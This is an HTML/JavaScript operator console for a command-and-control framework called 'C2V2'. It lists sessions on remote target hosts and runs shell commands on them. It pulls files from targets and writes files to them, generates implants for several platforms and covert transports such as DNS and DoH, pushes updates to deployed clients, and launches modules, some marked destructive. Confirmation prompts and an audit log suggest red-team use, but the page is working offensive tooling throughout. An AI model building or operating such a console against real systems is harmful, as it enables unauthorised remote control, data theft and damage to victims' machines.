<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>C2V2 Operator Console</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { margin:0; font:13px/1.45 ui-monospace,Consolas,monospace; background:#101317; color:#d6dde6; }
  header { display:flex; gap:12px; align-items:center; padding:8px 14px; background:#161b22; border-bottom:1px solid #263041; }
  header h1 { font-size:14px; margin:0; color:#7ee787; letter-spacing:.08em; }
  nav button { background:#1f2630; color:#c9d1d9; border:1px solid #2d3b4d; padding:5px 10px; cursor:pointer; }
  nav button.active { background:#2b6cb0; border-color:#4c9aff; color:#fff; }
  main { padding:14px; }
  section { display:none; }
  section.on { display:block; }
  table { border-collapse:collapse; width:100%; }
  th,td { text-align:left; padding:4px 8px; border-bottom:1px solid #202a38; vertical-align:top; }
  th { color:#8b98a9; font-weight:600; }
  input,textarea,select { background:#0b0f14; color:#d6dde6; border:1px solid #2d3b4d; padding:5px 7px; }
  textarea { width:100%; min-height:90px; }
  button.act { background:#1f6feb; color:#fff; border:none; padding:6px 12px; cursor:pointer; }
  button.danger { background:#a83232; }
  pre { background:#0b0f14; border:1px solid #202a38; padding:10px; overflow:auto; max-height:420px; white-space:pre-wrap; }
  .row { display:flex; gap:8px; align-items:center; margin:6px 0; flex-wrap:wrap; }
  .hint { color:#7d8a9b; }
  .err { color:#ff7b72; }
  .ok { color:#7ee787; }
  .pill { display:inline-block; padding:1px 7px; border-radius:9px; background:#21324a; }
</style>
</head>
<body>
<header>
  <h1>C2V2 OPERATOR</h1>
  <nav>
    <button data-tab="sessions" class="active">Sessions</button>
    <button data-tab="terminal">Terminal</button>
    <button data-tab="files">Files</button>
    <button data-tab="builder">Builder</button>
    <button data-tab="modules">Modules</button>
    <button data-tab="audit">Audit</button>
    <button data-tab="presence">Presence</button>
  </nav>
  <span class="hint">local GUI &middot; every destructive action asks for confirmation first</span>
</header>

<main>
  <section id="sessions" class="on">
    <div class="row"><button class="act" onclick="refresh()">Refresh</button><span id="stateMsg" class="hint"></span></div>
    <table><thead><tr><th>sid</th><th>host</th><th>os/arch</th><th>user</th><th>transport</th><th>tenant</th><th>online</th></tr></thead>
    <tbody id="sessBody"></tbody></table>
  </section>

  <section id="terminal">
    <div class="row">
      <label>session <input id="termSid" size="26" placeholder="sid"></label>
      <input id="termCmd" size="52" placeholder="whoami / id / dir">
      <button class="act" onclick="runShell()">Run (confirmed)</button>
    </div>
    <pre id="termOut">—</pre>
  </section>

  <section id="files">
    <div class="row">
      <label>session <input id="fileSid" size="26"></label>
      <label>path <input id="filePath" size="46" placeholder="C:\\Windows\\Temp\\x.txt or /etc/hosts"></label>
      <button class="act" onclick="fileGet()">Download</button>
    </div>
    <div class="row">
      <label>upload path <input id="upPath" size="46"></label>
      <label>data (base64) <input id="upData" size="36"></label>
      <button class="act danger" onclick="filePut()">Upload (confirmed)</button>
    </div>
    <pre id="fileOut">—</pre>
  </section>

  <section id="builder">
    <p class="hint">Profiles are generated by <code>c2builder</code>. This form shows the exact command and can publish a signed update manifest.</p>
    <div class="row">
      <label>platform <select id="bPlatform"><option>windows</option><option>linux</option><option>darwin</option><option>android</option></select></label>
      <label>arch <select id="bArch"><option>amd64</option><option>arm64</option><option>386</option><option>armv7</option></select></label>
      <label>transport <select id="bTransport"><option>tls</option><option>tcp</option><option>ws</option><option>wss</option><option>udp</option><option>dns</option><option>doh</option></select></label>
      <label>host <input id="bHost" value="c2.example.com" size="24"></label>
      <label>port <input id="bPort" value="443" size="6"></label>
    </div>
    <div class="row">
      <label>version <input id="bVersion" value="1.0.0" size="10"></label>
      <label>url <input id="bUrl" value="https://downloads.example.com/c2/client-1.0.0" size="44"></label>
      <label>sha256 <input id="bSha" size="44" placeholder="hex"></label>
    </div>
    <pre id="buildOut">—</pre>
    <div class="row">
      <button class="act" onclick="buildCmd()">Show builder command</button>
      <button class="act danger" onclick="publish()">Publish update (confirmed)</button>
      <button class="act" onclick="approve()">Approve &amp; push</button>
    </div>
  </section>

  <section id="modules">
    <div class="row">
      <input id="modQ" size="30" placeholder="search: shell, file, ai...">
      <button class="act" onclick="searchModules()">Search</button>
      <label>module <input id="modName" size="20"></label>
      <label>sid <input id="modSid" size="24"></label>
      <label>args (json) <input id="modArgs" size="24" value="{}"></label>
      <button class="act danger" onclick="runModule()">Run (confirmed)</button>
    </div>
    <pre id="modOut">—</pre>
  </section>

  <section id="audit">
    <div class="row"><button class="act" onclick="loadAudit()">Tail audit</button><button class="act" onclick="verifyAudit()">Verify chain</button></div>
    <pre id="auditOut">—</pre>
  </section>

  <section id="presence">
    <div class="row"><button class="act" onclick="loadPresence()">Refresh presence</button></div>
    <pre id="presOut">—</pre>
  </section>
</main>

<script>
const $ = id => document.getElementById(id);
document.querySelectorAll('nav button').forEach(b => b.onclick = () => {
  document.querySelectorAll('nav button').forEach(x => x.classList.toggle('active', x === b));
  document.querySelectorAll('section').forEach(s => s.classList.toggle('on', s.id === b.dataset.tab));
});

async function api(path, opts) {
  const r = await fetch(path, opts);
  const text = await r.text();
  try { return { code: r.status, body: JSON.parse(text) }; } catch { return { code: r.status, body: text }; }
}

async function cmd(action, args, confirm) {
  const headers = { 'Content-Type': 'application/json' };
  if (confirm) headers['X-C2-Confirm'] = 'yes';
  return api('/api/cmd', { method: 'POST', headers, body: JSON.stringify({ action, args: args || {} }) });
}

function pretty(v) { return typeof v === 'string' ? v : JSON.stringify(v, null, 2); }

async function refresh() {
  $('stateMsg').textContent = 'loading...';
  const { code, body } = await api('/api/state');
  if (code !== 200) { $('stateMsg').innerHTML = '<span class="err">' + pretty(body) + '</span>'; return; }
  let sessions = [];
  try { sessions = typeof body.sessions === 'string' ? JSON.parse(body.sessions) : body.sessions; } catch {}
  if (!Array.isArray(sessions)) sessions = [];
  $('sessBody').innerHTML = sessions.map(s => `<tr>
    <td>${s.sid}</td><td>${s.host || ''}</td><td>${(s.os||'') + '/' + (s.arch||'')}</td>
    <td>${s.user || ''}</td><td>${s.transport || ''}</td><td>${s.tenant || ''}</td>
    <td>${s.online ? '<span class="ok">online</span>' : '<span class="hint">stale</span>'}</td></tr>`).join('');
  $('stateMsg').textContent = sessions.length + ' session(s)';
}

async function runShell() {
  if (!confirm('Run this command on the target? It will be audited.')) return;
  const { body } = await cmd('shell', { sid: $('termSid').value.trim(), cmd: $('termCmd').value.trim(), timeout_ms: 60000 }, true);
  $('termOut').textContent = pretty(body);
}

async function fileGet() {
  const sid = $('fileSid').value.trim(), path = $('filePath').value.trim();
  const { body } = await api('/api/file?sid=' + encodeURIComponent(sid) + '&path=' + encodeURIComponent(path));
  $('fileOut').textContent = pretty(body);
}

async function filePut() {
  if (!confirm('Write this file to the target?')) return;
  const r = await fetch('/api/file', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-C2-Confirm': 'yes' },
    body: JSON.stringify({ sid: $('fileSid').value.trim(), path: $('upPath').value.trim(), b64: $('upData').value.trim() }) });
  $('fileOut').textContent = pretty(await r.text());
}

function buildCmd() {
  const s = `c2builder --platform ${$('bPlatform').value} --arch ${$('bArch').value} --transport ${$('bTransport').value}` +
    ` --host ${$('bHost').value} --port ${$('bPort').value} --name client --format exe`;
  $('buildOut').textContent = s + '\n\n# secrets and SNI come from environment variables, never from this page';
}

async function publish() {
  if (!confirm('Publish this manifest? It is staged and not pushed until approval.')) return;
  const { body } = await cmd('update-publish', {
    version: $('bVersion').value, platform: $('bPlatform').value, arch: $('bArch').value,
    url: $('bUrl').value, sha256: $('bSha').value, rollout: 100,
  }, true);
  $('buildOut').textContent = pretty(body);
}

async function approve() {
  const { body } = await cmd('update-approve', { version: $('bVersion').value });
  $('buildOut').textContent = pretty(body);
}

async function searchModules() {
  const { body } = await cmd('module-search', { q: $('modQ').value });
  $('modOut').textContent = pretty(body);
}

async function runModule() {
  if (!confirm('Run this module? Destructive modules are audited and may be refused.')) return;
  let args = {};
  try { args = JSON.parse($('modArgs').value || '{}'); } catch { alert('args must be JSON'); return; }
  const { body } = await cmd('module-run', { name: $('modName').value.trim(), sid: $('modSid').value.trim(), args }, true);
  $('modOut').textContent = pretty(body);
}

async function loadAudit() {
  const { body } = await cmd('audit', { limit: 80 });
  $('auditOut').textContent = pretty(body);
}
async function verifyAudit() {
  const { body } = await cmd('verify-audit', {});
  $('auditOut').textContent = pretty(body);
}
async function loadPresence() {
  const { body } = await cmd('presence', {});
  $('presOut').textContent = pretty(body);
}
refresh();
</script>
</body>
</html>
